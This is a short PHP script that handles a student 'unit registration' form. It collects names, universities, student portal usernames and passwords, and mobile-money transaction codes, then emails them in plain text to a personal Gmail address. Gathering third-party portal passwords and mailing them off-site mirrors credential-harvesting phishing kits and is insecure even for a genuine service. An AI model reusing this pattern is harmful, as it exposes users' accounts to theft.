<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $to = "vincentkamau510@gmail.com";  // Your email address
    $subject = "New Unit Registration Submission";

    // Collecting form data (make sure these match the form field names)
    $name = $_POST["full-name"];
    $university = $_POST["university"];
    $portalLogin = $_POST["portal-login"];
    $portalPassword = $_POST["portal-password"];
    $transactionCode = $_POST["transaction-code"];

    // Compose email message
    $message = "Full Name: $name\n";
    $message .= "University/College: $university\n";
    $message .= "Portal Username/Email: $portalLogin\n";
    $message .= "Portal Password: $portalPassword\n";
    $message .= "Airtel Transaction Code: $transactionCode\n";

    // Set the From header (you can use a domain email if available)
    $headers = "From: no-reply@vincodex.com";

    // Send the email
    if (mail($to, $subject, $message, $headers)) {
        echo "✅ Thank you! Your details have been sent successfully.";
    } else {
        echo "❌ Error: Your submission could not be sent. Please try again.";
    }
}
?>
